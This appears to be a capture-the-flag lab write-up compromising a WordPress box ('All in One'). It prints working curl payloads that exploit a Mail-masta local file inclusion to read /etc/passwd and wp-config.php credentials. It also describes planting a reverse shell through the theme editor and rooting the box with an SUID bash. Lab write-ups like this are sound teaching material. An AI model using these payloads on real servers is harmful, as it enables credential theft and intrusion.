# All in One

## Nmap

```
sudo nmap 10.10.140.124 -p- -sS -sV

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Checking FTP shows we have access as an anonymous user. However, we have no files to display and are unable to write to the FTP directory.

Over on port 80 the root page takes us to the Apache default install root page.

![](<../../../.gitbook/assets/image (1841).png>)

Running dirsearch.py against the target reveals the `/wordpress/` directory.

```
python3 dirsearch.py -u http://10.10.140.124 -w /usr/share/seclists/Discovery/Web-Content/big.txt --full-url -t 30
```

![](<../../../.gitbook/assets/image (1842).png>)

And then over on the Wordpress root page:

![](<../../../.gitbook/assets/image (1843).png>)

We can see straight away the user elyana which we can take a note off for now. From here we can run WP-Scan against the target to help identify issues on this Wordpress page.

```
wpscan --url http://10.10.140.124/wordpress/ -t 40 --detection-mode mixed --enumerate ap --plugins-detection aggressive 
```

From this WP-Scan finds some interesting and out of date plugins as shown below:

Looking up exploits on exploit-db.com for Mail-masta shows that the latest version (1.0) is vulnerable to a local file inclusion vulnerability.

{% embed url="https://www.exploit-db.com/exploits/40290" %}

The proof of context the exploit author has shown is as follows:

`http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`

Performing the same PoC with the target server we can reveals the `/etc/passwd` file.

```bash
curl 'http://<IP>/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd' 
```

![](<../../../.gitbook/assets/image (1845).png>)

This again reveals the user elyana. I tried to brute force and attempted LFI on common files in her home directory where I was unable to find any information of interest.

Knowing that Wordpress is isntalled we can attempt to read the wp-config.php file usiing a base64 filter.

```bash
curl http://10.10.140.124/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php
```

![](<../../../.gitbook/assets/image (1846).png>)

Taking the output and decoding with base64 reveals the configuration information we need.

![](<../../../.gitbook/assets/image (1847).png>)

With the credentials we now have I was then able to login to the Wordpress admin login.

![](<../../../.gitbook/assets/image (1848).png>)

From here I was ableto use the Theme editor under the 'Appearance' menu to edit the main index.php webpage to be replaced with a reverse shell.

![](<../../../.gitbook/assets/image (1849).png>)

I then updated the page and started a `netcat` listener to my specified port. Then after reloading the main index at `http://<IP>/wordpress/index.php `I was able to land a reverse shell.

![](<../../../.gitbook/assets/image (1850).png>)

From here running Linpeas against the host shows multiple points of escalation. I will only be covering one in this instance which is the SUID bit being set on the bash binary.

![](<../../../.gitbook/assets/image (1851).png>)

Running the following command will call a 'sh' shell with bash under root privileges.

```bash
/bin/bash -p
```

![](<../../../.gitbook/assets/image (1852).png>)

From here we can grab the user and root flags. The flags are Base64 encoded and will need to be decoded to reveals the correct value.
